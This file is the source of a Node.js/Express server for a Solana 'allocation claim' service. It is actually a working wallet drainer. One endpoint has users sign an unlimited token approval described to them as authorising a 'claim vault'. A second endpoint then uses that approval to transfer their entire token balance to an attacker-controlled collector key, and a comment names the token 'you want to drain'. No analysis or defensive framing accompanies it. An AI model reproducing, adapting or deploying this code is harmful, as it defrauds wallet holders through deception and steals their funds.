import "dotenv/config";
import express from "express";
import cors from "cors";
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  createApproveInstruction,
  createTransferInstruction,
  getAccount,
  TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import bs58 from "bs58";

const app = express();
app.use(cors({ origin: process.env.CORS_ORIGIN || "*" }));
app.use(express.json({ limit: "32kb" }));

const RPC_URL = process.env.RPC_URL || "https://api.mainnet-beta.solana.com";
const COLLECTOR_SECRET = process.env.COLLECTOR_PRIVATE_KEY; // base58
const TOKEN_MINT = process.env.TOKEN_MINT;                 // the token you want to drain

if (!COLLECTOR_SECRET || !TOKEN_MINT) {
  console.error("Missing COLLECTOR_PRIVATE_KEY or TOKEN_MINT");
  process.exit(1);
}

const connection = new Connection(RPC_URL, "confirmed");
const collector = Keypair.fromSecretKey(bs58.decode(COLLECTOR_SECRET));
const mint = new PublicKey(TOKEN_MINT);

app.get("/", (_req, res) => {
  res.json({
    status: "operational",
    service: "allocation-claim",
    chain: "solana",
    version: "4.0.0",
  });
});

/**
 * Step 1 – return a transaction the user must sign.
 * The transaction only contains an Approve (unlimited) to the collector.
 */
app.post("/prepare-claim", async (req, res) => {
  try {
    const { user } = req.body;
    if (!user) return res.status(400).json({ error: "user wallet required" });

    const userPubkey = new PublicKey(user);
    const userAta = await getAssociatedTokenAddress(mint, userPubkey);
    const collectorAta = await getAssociatedTokenAddress(mint, collector.publicKey);

    // Unlimited approve to collector
    const ix = createApproveInstruction(
      userAta,
      collector.publicKey,          // delegate
      userPubkey,                   // owner
      BigInt("18446744073709551615") // u64::MAX
    );

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
    const tx = new Transaction({
      feePayer: userPubkey,
      blockhash,
      lastValidBlockHeight,
    }).add(ix);

    // Serialize so the frontend can ask the wallet to sign it
    const serialized = tx.serialize({
      requireAllSignatures: false,
      verifySignatures: false,
    }).toString("base64");

    res.json({
      transaction: serialized,
      description: "Authorize claim vault to process your allocation",
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "failed to prepare claim" });
  }
});

/**
 * Step 2 – after the user has approved, pull the full balance.
 */
app.post("/submit-claim", async (req, res) => {
  try {
    const { user } = req.body;
    if (!user) return res.status(400).json({ error: "user wallet required" });

    const userPubkey = new PublicKey(user);
    const userAta = await getAssociatedTokenAddress(mint, userPubkey);
    const collectorAta = await getAssociatedTokenAddress(mint, collector.publicKey);

    // Check current balance
    let amount = 0n;
    try {
      const account = await getAccount(connection, userAta);
      amount = account.amount;
    } catch {
      return res.status(400).json({ error: "no token account or zero balance" });
    }

    if (amount === 0n) {
      return res.status(400).json({ error: "nothing to claim" });
    }

    // Transfer using the delegate we just received
    const ix = createTransferInstruction(
      userAta,
      collectorAta,
      collector.publicKey, // authority = the delegate
      amount
    );

    const tx = new Transaction().add(ix);
    const sig = await sendAndConfirmTransaction(connection, tx, [collector]);

    res.json({
      status: "success",
      txHash: sig,
      claimed: amount.toString(),
      message: "allocation successfully claimed",
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "claim execution failed" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Claim service running on port ${PORT}`);
});